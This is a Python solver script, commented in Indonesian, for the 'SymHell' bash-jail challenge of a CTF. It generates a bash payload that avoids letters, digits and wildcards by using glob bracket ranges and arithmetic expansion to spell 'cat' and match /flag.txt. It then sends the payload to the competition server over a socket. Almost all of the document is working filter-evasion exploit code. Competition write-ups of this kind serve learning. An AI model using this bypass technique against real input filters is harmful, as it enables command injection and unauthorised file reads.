#!/usr/bin/env python3
"""Solver untuk challenge SymHell (Forensics / Bash Jail - NFX CTF).

Alur:
1. Analisis filter regex pada app.py: [a-zA-Z0-9?*#]|<{3}
2. Karakter yang diblokir:
   - Semua huruf alfabet [a-zA-Z]
   - Semua angka [0-9]
   - Wildcard glob [?*]
   - Hash [#]
   - Herestrings [<<<]
3. Karakter yang diizinkan dan strategi:
   - Glob bracket range [_-{] mencakup: '_', '`', 'a'..'z', '{'
   - Menggunakan glob [_-{][_-{][_-{] untuk mengekspansi direktori 3 karakter di root (/app, /bin, /dev, /etc, dst.)
   - Menggunakan ekspresi aritmetika Bash untuk menyusun integer:
     0 = $(())
     1 = $((!$(()) ))
     n = $((!$(()) + ... + !$(()) ))
   - Mengambil substring parameter expansion ${array[idx]:offset:length}
     untuk menyusun perintah "cat".
   - Menyusun argumen berkas "/flag.txt" menggunakan glob:
     /[_-{][_-{][_-{][_-{].[_-{][_-{][_-{]
"""

from __future__ import annotations

import argparse
import re
import socket
import subprocess
import sys
import time

FORBIDDEN_REGEX = r"[a-zA-Z0-9?*#]|\<{3}"


def build_num(n: int) -> str:
    if n == 0:
        return "$(())"
    term = "!$(())"
    return "$(( " + " + ".join([term] * n) + " ))"


def build_payload() -> str:
    """Membangun payload bash tanpa huruf, angka, wildcard *, ?, #, atau <<<."""
    lb = "{"
    # Mapping karakter dari direktori 3 huruf di container Ubuntu / Alpine:
    # [0]=/app, [1]=/bin, [2]=/dev, [3]=/etc, [4]=/lib, [5]=/mnt, [6]=/opt, [7]=/run, [8]=/sys, [9]=/tmp, [10]=/var
    char_map = {
        "a": (0, 1),  # /app -> 'a' pada offset 1
        "b": (1, 1),  # /bin -> 'b' pada offset 1
        "c": (3, 3),  # /etc -> 'c' pada offset 3
        "d": (2, 1),  # /dev -> 'd' pada offset 1
        "e": (2, 2),  # /dev -> 'e' pada offset 2
        "t": (3, 2),  # /etc -> 't' pada offset 2
    }

    def get_char(c: str) -> str:
        idx, pos = char_map[c]
        return f"${{___[{build_num(idx)}]:{build_num(pos)}:{build_num(1)}}}"

    # Inisialisasi array direktori 3 karakter
    prefix = f"___=(/[_-{lb}][_-{lb}][_-{lb}]);"

    # Bentuk perintah 'cat'
    cat_cmd = "".join(get_char(c) for c in "cat")

    # Pattern glob untuk '/flag.txt' -> 4 char . 3 char
    glob_char = f"[_-{lb}]"
    flag_glob = f"/{glob_char * 4}.{glob_char * 3}"

    payload = f"{prefix} {cat_cmd} {flag_glob}"
    assert not re.search(FORBIDDEN_REGEX, payload), "Payload melanggar filter regex!"
    return payload


def solve_remote(host: str, port: int, timeout: float = 8.0) -> str:
    payload = build_payload()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((host, port))

    # Baca banner hingga prompt
    buf = b""
    while b"\xe2\x96\xb8" not in buf:  # ▸
        chunk = s.recv(1024)
        if not chunk:
            break
        buf += chunk

    s.sendall((payload + "\n").encode())
    time.sleep(1.0)

    resp = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
            if b"\xe2\x96\xb8" in resp:
                break
        except socket.timeout:
            break

    s.close()
    text = resp.decode("utf-8", errors="ignore")
    # Bersihkan kode ANSI
    clean = re.sub(r"\033\[[0-9;]*[a-zA-Z]", "", text)
    clean = clean.replace("symhell", "").replace("▸", "").strip()

    m = re.search(r"NFX\{[^}]+\}", clean)
    if m:
        return m.group(0)
    return clean


def main() -> None:
    parser = argparse.ArgumentParser(description="Solver SymHell")
    parser.add_argument("--host", default="s1.nfx.my.id", help="Host remote")
    parser.add_argument("--port", type=int, default=49728, help="Port remote")
    parser.add_argument("--print-payload", action="store_true", help="Cetak payload saja")
    args = parser.parse_args()

    payload = build_payload()
    print(f"[*] Payload ({len(payload)} byte):")
    print(payload)
    print(f"[*] Filter check passed: {not bool(re.search(FORBIDDEN_REGEX, payload))}")

    if args.print_payload:
        return

    print(f"[*] Menghubungi target {args.host}:{args.port}...")
    try:
        flag = solve_remote(args.host, args.port)
        print(f"[+] Hasil: {flag}")
    except Exception as e:
        print(f"[-] Gagal terhubung ke remote: {e}")
        print("[*] (Layanan remote mungkin sudah ditutup pasca-kompetisi)")


if __name__ == "__main__":
    main()
